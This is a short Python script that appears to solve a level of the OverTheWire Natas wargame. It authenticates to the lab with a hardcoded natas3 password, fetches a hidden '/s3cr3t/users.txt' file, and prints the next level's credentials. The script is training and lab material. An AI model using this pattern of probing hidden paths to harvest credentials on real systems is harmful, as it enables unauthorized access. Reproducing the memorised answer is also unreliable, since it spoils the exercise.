import requests
import re

url = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
user = "natas3"
password = "G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q"

r = requests.get(url, auth=(user, password))

credentials = r.text.splitlines()

for credential in credentials:
	if "natas4" in credential.split(":"):
		print(credential)

